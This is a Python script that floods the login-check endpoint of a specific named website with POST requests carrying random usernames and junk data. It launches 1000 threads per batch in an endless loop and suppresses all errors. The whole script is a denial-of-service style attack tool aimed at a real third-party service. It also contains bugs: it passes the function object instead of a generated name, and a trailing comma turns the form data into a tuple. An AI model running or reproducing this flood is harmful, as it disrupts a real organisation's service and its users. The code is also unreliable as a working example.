import random
import threading
import requests

url = "https://f.kyee.com.cn/RightsSystem/LoginHandler.jspx?op=loginUserCheck"

headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
    'Connection': 'keep-alive',
    'origin': "https://f.kyee.com.cn",
    'referer': "https://f.kyee.com.cn",
    'X-Requested-With': "XMLHttpRequest",
    'content-type': "application/x-www-form-urlencoded; charset=UTF-8"
}


def requestApi():
    name = str(randomName)
    fields = {
        'u_name': name,
        'firstLoadData': generate_random_str(128)
    },
    try:
        requests.post(url=url, data=fields, headers=headers, timeout=1)
    except Exception as e:
        e


def randomName():
    return random.randint(10000, 99999)


def generate_random_str(lengthStr):
    random_str = ''
    base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
    length = len(base_str) - 1
    for i in range(lengthStr):
        random_str += base_str[random.randint(0, length)]
    return random_str


def threadSend():
    threads = []
    for t in range(1000):
        threads.append(threading.Thread(target=requestApi, args=()))
    for thr in threads:
        thr.start()
    for thr in threads:
        thr.join()


if __name__ == '__main__':
    i = 0
    while True:
        threadSend()
        i = i + 1
        print(i)
